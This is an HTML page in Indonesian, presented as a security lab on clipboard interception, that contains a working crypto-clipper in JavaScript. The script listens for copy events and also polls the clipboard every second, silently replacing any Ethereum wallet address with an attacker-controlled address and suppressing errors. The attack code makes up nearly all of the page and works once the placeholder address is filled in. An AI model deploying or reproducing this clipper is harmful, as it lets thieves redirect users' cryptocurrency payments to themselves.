<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Security Research: Clipboard Monitor</title>
</head>
<body>
    <h2>Laboratorium Uji Keamanan: Clipboard Interception</h2>
    <p>Halaman ini memantau clipboard Anda. Jika Anda menyalin alamat dompet (format 0x...), skrip ini akan mencoba menggantinya secara otomatis.</p>
    
    <script>
        const ATTACKER_ADDRESS = "0xYourAttackerAddressHere"; // Ganti dengan alamat uji Anda
        
        // Pola Regex sederhana untuk mendeteksi alamat Ethereum
        const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;

        // Listener untuk mendeteksi aksi copy oleh pengguna
        document.addEventListener('copy', async (e) => {
            const clipboardData = await navigator.clipboard.readText();
            
            // Jika konten clipboard adalah alamat dompet, kita timpa
            if (ethAddressRegex.test(clipboardData.trim())) {
                try {
                    await navigator.clipboard.writeText(ATTACKER_ADDRESS);
                    console.log("Clipboard berhasil di-hijack!");
                } catch (err) {
                    console.error("Gagal melakukan overwrite:", err);
                }
            }
        });

        // Alternatif: Polling setiap 1 detik untuk skenario background monitoring
        setInterval(async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (ethAddressRegex.test(text.trim()) && text.trim() !== ATTACKER_ADDRESS) {
                    await navigator.clipboard.writeText(ATTACKER_ADDRESS);
                }
            } catch (err) {
                // Silently fail (banyak browser memblokir readText jika tidak di-focus)
            }
        }, 1000);
    </script>
</body>
</html>
